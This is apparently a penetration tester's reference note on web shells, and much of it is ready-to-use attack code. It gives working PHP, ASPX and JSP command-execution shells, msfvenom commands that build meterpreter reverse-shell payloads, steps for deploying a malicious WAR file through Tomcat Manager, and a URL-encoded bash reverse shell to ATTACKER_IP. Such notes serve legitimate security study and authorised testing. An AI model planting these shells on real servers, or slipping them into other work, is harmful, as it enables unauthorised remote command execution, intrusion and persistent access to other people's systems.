---
title: "Web Shells"
created: 2026-03-11
updated: 2026-11-16
type: technique
tags: [technique, exploitation, shells, web]
---

# Web Shells

A script uploaded to a web server that executes OS commands through HTTP requests. Useful when reverse shells are blocked by firewalls, or as a stepping stone to get one.

---

## How It Works

1. Find a file upload vulnerability (or writable directory)
2. Upload a script in the server's language (PHP, ASP, JSP)
3. Browse to the uploaded file
4. Pass commands via URL parameters or a form
5. The server executes them and returns the output in the response

The shell runs as the web server's user (`www-data`, `apache`, `iis apppool\defaultapppool`).

---

## PHP Web Shells

### One-liner

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Usage: `http://target/shell.php?cmd=whoami`

The `<pre>` tags preserve formatting in the browser. `shell_exec()` runs the command and returns stdout.

### Alternative PHP functions

| Function | Difference |
|----------|-----------|
| `shell_exec()` | Returns full output as a string |
| `exec()` | Returns only the last line of output |
| `system()` | Outputs directly, returns last line |
| `passthru()` | Outputs raw binary (good for downloading files) |
| `popen()` | Opens a pipe to the process (no direct output) |

If one function is disabled in `php.ini`, try another.

### PentestMonkey PHP reverse shell

Full reverse shell (not just command execution) — pre-installed on Kali at `/usr/share/webshells/php/php-reverse-shell.php`.

Edit these two lines before uploading:

```php
$ip = 'ATTACKER_IP';
$port = 4444;
```

Start a listener (`nc -lvnp 4444`), then browse to the uploaded file. It connects back immediately — no URL parameters needed.

**Linux only** — this script uses `/bin/sh` and Unix sockets. For Windows targets, use a PowerShell or msfvenom-generated web shell instead.

---

## ASP / ASPX Web Shells (IIS / Windows)

### CMD execution (ASPX)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<pre><%
string cmd = Request["cmd"];
if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%></pre>
```

Usage: `http://target/shell.aspx?cmd=whoami`

### Msfvenom ASPX shell

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx
```

---

## JSP Web Shells (Tomcat / Java)

### Basic JSP shell

```jsp
<%@ page import="java.util.*,java.io.*"%>
<pre>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}
%>
</pre>
```

Usage: `http://target:8080/shell.jsp?cmd=id`

### WAR deployment (Tomcat Manager)

If you have Tomcat Manager credentials:

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
```

Upload through `/manager/html`, then browse to `http://target:8080/shell/` to trigger.

---

## Upgrading to a Full Shell

A web shell is limited — no interactivity, one command at a time, output only through HTTP. Upgrade to a reverse shell as soon as possible:

```bash
# From a PHP web shell (Linux target)
http://target/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'

# From a web shell (Windows target) — URL-encoded PowerShell reverse shell
http://target/shell.aspx?cmd=powershell+-e+<base64_encoded_reverse_shell>
```

URL-encode special characters (`&` → `%26`, space → `+` or `%20`, `>` → `%3e`).

---

## Kali's Built-in Web Shells

```bash
ls /usr/share/webshells/
# asp/   aspx/   cfm/   jsp/   laudanum/   perl/   php/
```

Key files:
- `php/php-reverse-shell.php` — full reverse shell
- `php/simple-backdoor.php` — one-liner cmd execution
- `aspx/cmdasp.aspx` — ASP.NET command shell with HTML form
- `jsp/cmdjsp.jsp` — JSP command shell

---

## Related Notes

- [[Shells and Listeners]] — catching reverse shells, stabilisation
- [[Msfvenom]] — generating web payloads (PHP, ASPX, WAR)
